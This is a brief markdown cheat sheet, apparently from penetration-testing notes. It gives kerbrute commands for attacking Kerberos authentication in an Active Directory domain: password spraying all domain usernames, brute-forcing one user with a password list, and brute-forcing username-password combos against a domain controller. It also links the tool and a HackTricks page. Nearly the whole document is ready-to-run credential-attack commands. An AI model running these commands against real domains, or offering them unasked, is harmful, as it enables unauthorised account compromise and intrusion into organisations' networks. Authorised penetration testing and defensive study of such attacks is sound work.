# Kerberos

- Password Spray each domain username accounts from an active directory

`$ ./kerbrute passwordspray -d <FQDN> users.lst <password>`

- Brute force a username with a password dictionary (not recommended unless it has no lockout policy!)

`$ ./kerbrute bruteuser -d <FQDN> passwords.lst <username>`

- Brute force with a combo list of usernames and passwords against a domain controller

`$ cat combos.lst | ./kerbrute -d <FQDN> bruteforce -`

---
## References

- [Kerbrute](https://github.com/ropnop/kerbrute)

- [https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)